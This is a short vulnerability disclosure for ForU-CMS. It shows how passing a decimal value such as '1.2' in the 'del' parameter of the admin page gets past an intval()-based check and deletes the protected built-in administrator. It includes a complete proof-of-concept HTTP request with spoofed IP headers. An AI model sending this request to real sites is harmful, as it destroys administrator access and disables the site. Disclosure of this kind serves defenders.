ForU-CMS logic flaw led to the deletion of underlying administrators

downlaod:https://gitee.com/sw1981/ForU-CMS

version:dev Official version

1. When deleting the underlying administrator, it prompts that it cannot be deleted.

![image](https://github.com/RCEraser/cve/assets/131632691/6730775c-fcf0-42bf-9045-115a675255e0)


2. Use burp to capture packets and change the del parameter value to 1.X to directly delete the underlying administrator account and bypass back-end restrictions.
```
POC
GET /admin/cms_admin.php?del=1.2 HTTP/1.1
Host: www.forucms.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.forucms.com/admin/cms_admin.php
Cookie: cms[mail_size]=40; token_user=61646d696e2b31; PHPSESSID=7to756v150s0h9ib4a93t4tcr4; cms[url_back]=http%3A%2F%2Fwww.forucms.com%2Findex.php
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 1.1.1.1
X-Originating-IP: 1.1.1.1
X-Remote-IP: 1.1.1.1
X-Remote-Addr: 1.1.1.1
```

![image](https://github.com/RCEraser/cve/assets/131632691/7bffdfdb-dc44-4331-bf81-4bbc6339684f)

![image](https://github.com/RCEraser/cve/assets/131632691/91399f52-ca85-43e0-9807-b541ab130bdd)

3. After the underlying administrator is deleted, all functions become unavailable.
![image](https://github.com/RCEraser/cve/assets/131632691/9738f8d9-9899-4655-b89b-6010ed3ff12a)

4. Since we use the intval() function, we can construct 1.x at the del argument to bypass the backend restriction and remove the underlying administrator directly.
![image](https://github.com/RCEraser/cve/assets/131632691/9899ca04-e90a-493d-83cd-bfffe84d3a9b)

